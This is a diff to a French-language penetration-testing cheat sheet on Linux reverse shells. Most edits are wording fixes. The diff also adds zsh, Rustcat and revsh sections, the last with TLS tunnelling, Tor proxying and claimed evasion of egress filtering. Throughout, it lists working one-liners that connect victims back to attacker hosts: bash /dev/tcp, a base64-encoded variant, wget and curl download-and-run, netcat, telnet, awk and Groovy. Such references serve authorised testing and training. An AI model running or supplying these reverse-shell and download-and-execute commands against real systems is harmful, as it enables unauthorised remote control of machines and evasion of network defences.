@@ -23,7 +23,7 @@ exec >&0
 ```
 N'oubliez pas de vérifier avec d'autres shells : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
 
-### Shell sûr pour les symboles
+### Shell sûr symbolique
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -45,9 +45,9 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Shell inversé
+## Forward Shell
 
-Lorsqu'il s'agit d'une vulnérabilité **Remote Code Execution (RCE)** dans une application web basée sur Linux, l'obtention d'un shell inversé peut être entravée par des défenses réseau telles que les règles iptables ou des mécanismes de filtrage de paquets complexes. Dans de tels environnements contraints, une approche alternative consiste à établir un shell PTY (Pseudo Terminal) pour interagir plus efficacement avec le système compromis.
+Lorsqu'il s'agit d'une vulnérabilité de **Remote Code Execution (RCE)** dans une application web basée sur Linux, l'obtention d'un reverse shell peut être entravée par des défenses réseau telles que les règles iptables ou des mécanismes de filtrage de paquets complexes. Dans de tels environnements contraints, une approche alternative consiste à établir un shell PTY (Pseudo Terminal) pour interagir plus efficacement avec le système compromis.
 
 Un outil recommandé à cet effet est [toboggan](https://github.com/n3rada/toboggan.git), qui simplifie l'interaction avec l'environnement cible.
 
@@ -81,7 +81,7 @@ toboggan -m nix.py -i
 ```
 Pour tirer directement parti d'un shell interactif. Vous pouvez ajouter `-b` pour l'intégration de Burpsuite et supprimer le `-i` pour un wrapper rce plus basique.
 
-Une autre possibilité consiste à utiliser l'implémentation de shell forward `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Une autre possibilité consiste à utiliser l'implémentation de shell forward de `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Vous devez simplement modifier :
 
@@ -89,7 +89,7 @@ Vous devez simplement modifier :
 - Le préfixe et le suffixe de votre payload (le cas échéant)
 - La manière dont le payload est envoyé (en-têtes ? données ? informations supplémentaires ?)
 
-Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les pipes sont lus et écrits avec un délai d'environ 1,3 s).
+Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les pipes sont lus et écrits avec un délai d'environ 1,3 seconde).
 
 ## Netcat
 ```bash
@@ -118,7 +118,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Pour envoyer la commande, écrivez-la, appuyez sur entrer et appuyez sur CTRL+D (pour arrêter STDIN)
+Pour envoyer la commande, écrivez-la, appuyez sur entrée et appuyez sur CTRL+D (pour arrêter STDIN)
 
 **Victime**
 ```bash
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (TCP intégré)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – écouteur moderne similaire à netcat écrit en Rust (emballé dans Kali depuis 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Fonctionnalités :
+- Optionnel `--ssl` pour un transport chiffré (TLS 1.3)
+- `-s` pour lancer n'importe quel binaire (par exemple, `/bin/sh`, `python3`) sur la victime
+- `--up` pour passer automatiquement à un PTY entièrement interactif
+
+## revsh (chiffré et prêt pour le pivot)
+
+`revsh` est un petit client/serveur C qui fournit un TTY complet via un **tunnel Diffie-Hellman chiffré** et peut optionnellement attacher une interface **TUN/TAP** pour un pivotement de type VPN inversé.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Flags utiles :
+- `-b` : shell bind au lieu de reverse
+- `-p socks5://127.0.0.1:9050` : proxy via TOR/HTTP/SOCKS
+- `-t` : créer une interface TUN (VPN inverse)
+
+Parce que l'ensemble de la session est chiffré et multiplexé, cela contourne souvent le filtrage sortant simple qui tuerait un shell `/dev/tcp` en texte clair.
+
 ## OpenSSL
 
 L'attaquant (Kali)
@@ -259,7 +301,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Pour envoyer la commande, écrivez-la, appuyez sur entrer et appuyez sur CTRL+D (pour arrêter STDIN)
+Pour envoyer la commande, écrivez-la, appuyez sur entrée et appuyez sur CTRL+D (pour arrêter STDIN)
 
 **Victime**
 ```bash
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-par [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) REMARQUE : Le reverse shell Java fonctionne également pour Groovy
+par [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) REMARQUE : le reverse shell Java fonctionne également pour Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
